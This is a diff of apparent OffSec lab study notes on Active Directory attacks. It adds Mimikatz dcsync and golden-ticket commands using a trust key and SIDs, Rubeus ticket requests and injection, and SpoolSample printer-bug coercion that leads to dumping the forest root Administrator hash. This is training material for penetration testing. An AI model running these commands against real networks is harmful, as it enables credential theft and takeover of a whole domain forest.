@@ -6440,6 +6440,8 @@ The print spooler service must be running and available on the domain controller
 
 Log in to appsrv01 as the Offsec user and attempt to access the named pipe
 
+Testing access to print spooler service on CDC01
+
 ```pwsh
 dir \\cdc01\pipe\spoolss
 ```
@@ -7047,7 +7049,7 @@ We are now a member of Enterprise Admins.
 
 ExtraSids can be blocked between domains in the same forest with **domain quarantine** which can be configured with the **Netdom** tool. However, this also blocks legitimate access so this solution is rarely implemented.
 
-Find the **trust key** for `corp1.com` and use it to craft a golden ticket instead of the krbtgt password hash. (not working)
+Find the **trust key** for `corp1.com` and use it to craft a golden ticket instead of the krbtgt password hash.
 
 [Rubeus2](https://github.com/Flangvik/SharpCollection/tree/master/)
 
@@ -7055,10 +7057,62 @@ Find the **trust key** for `corp1.com` and use it to craft a golden ticket inste
 lsadump::dcsync /domain:prod.corp1.com /user:prod\corp1$
 
 kerberos::golden /user:h4x /domain:prod.corp1.com /sid:S-1-5-21-634106289-3621871093-708134407 /sids:S-1-5-21-1587569303-1110564223-1586047116-519 /rc4:d6eba9e9b9bb466be9d9d20c5584c9ef /service:krbtgt /target:corp1.com /ticket:trust_key.kirbi
+```
 
+```cmd
 Rubeus2.exe asktgs /ticket:trust_key.kirbi /dc:rdc01.corp1.com /service:cifs/rdc01.corp1.com /ptt
 ```
 
 ### Owning the Forest with Printers
+
+Using the printer bug to directly target a domain controller in the **forest root domain** and instantly compromise the entire forest from a single server.
+
+This technique **does not require Domain Admin privileges**. However, if we obtain Domain Admin privileges in `prod.corp1.com` through some other vector, we could configure a server with unconstrained Kerberos delegation and use that to compromise any other domain in the forest.
+
+Log in to appsrv01 as the Offsec user
+
+Testing access to print spooler service on RDC01 root domain controller:
+
+```pwsh
+ls \\rdc01\pipe\spoolss
+```
+
+Use the RpcRemoteFindFirstPrinterChangeNotification API to force an authentication and allow us to obtain a forwardable TGT.
+
+Open an administrative command prompt and then use Rubeus to monitor for new tickets from the root domain controller machine account:
+
+```bat
+Rubeus.exe monitor /interval:5 /filteruser:RDC01$ /nowrap
+```
+...
+
+Launch SpoolSample to force the print change notification from rdc01:
+
+```pwsh
+.\SpoolSample.exe rdc01.corp1.com appsrv01.prod.corp1.com
+```
+
+Switch back to our Rubeus monitor, and the new TGT is displayed.
+
+Obtained a forwardable TGT for the root domain controller machine account, we can use Rubeus to inject it into memory
+
+```bat
+Rubeus.exe ptt /ticket:doIE9DCCBPCgAwIBBaEDAgEWooIEBDCCBABhggP8MIID+...
+```
+
+The root domain controller computer account is not a local administrator on rdc01, so we cannot directly obtain code execution. However, a domain controller computer account has the access right to perform AD replication.
+
+Forcing a replication with Mimikatz dcsync:
+
+```
+lsadump::dcsync /domain:corp1.com /user:corp1\administrator
+```
+
+We now have the NTLM password hash of the **root domain Administrator account** and have obtained access to the **Enterprise Admins** group.
+
+In 2018, security researcher @harmj0y found that it is possible to trigger the print spooler authentication across a forest trust and obtain a forwardable TGT.
+
+In 2019, Microsoft issued two rounds of security advisories and updates. The first blocked TGT delegation for all new forest trusts, while the second blocked it for existing forest trust as well.
+
 
 
